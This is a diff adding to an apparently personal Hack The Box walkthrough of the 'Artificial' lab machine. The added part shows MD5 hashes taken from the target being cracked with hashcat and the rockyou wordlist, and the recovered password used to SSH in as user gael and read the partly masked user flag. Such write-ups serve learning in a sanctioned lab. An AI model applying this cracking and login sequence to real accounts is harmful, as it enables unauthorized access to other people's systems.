@@ -2,6 +2,8 @@
 
 #### https://app.hackthebox.com/machines/Artificial
 
+#### ---USER FLAG---
+
 **Dockerfile**
 ```
 FROM python:3.8-slim
@@ -171,3 +173,76 @@ app:x:1001:1001:,,,:/home/app:/bin/bash
 mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 _laurel:x:997:997::/var/log/laurel:/bin/false
 ```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb$ cat hash.txt                                                                1 ↵  
+c99175974b6e192936d97224638a34f8
+05c043f7120f53af8271be95598ac44e
+```
+
+```Hexada@hexada ~/pentest-env/vrm/artificial.htb$ hashcat -m 0 -a 0 hash.txt /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt -o password.txt
+hashcat (v6.2.6) starting
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+INFO: Removed hash found as potfile entry.
+
+Host memory required for this attack: 1027 MB
+
+Dictionary cache hit:
+* Filename..: /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb$ cat passwords.txt                                                                
+c99175974b6e192936d97224638a34f8:mattp005num*****
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/artificial.htb$ ssh gael@artificial.htb                                                          
+
+gael@artificial.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat 28 Jun 2025 08:43:23 PM UTC
+
+  System load:           0.03
+  Usage of /:            72.5% of 7.53GB
+  Memory usage:          39%
+  Swap usage:            0%
+  Processes:             272
+  Users logged in:       2
+  IPv4 address for eth0: 10.10.11.74
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:7c4
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Jun 28 20:43:24 2025 from 10.10.16.55
+gael@artificial:~$ ls
+user.txt
+gael@artificial:~$ cat user.txt
+093dcc6786be90ee488*****
+gael@artificial:~$ 
+```
+
+#### ---ROOT FLAG---
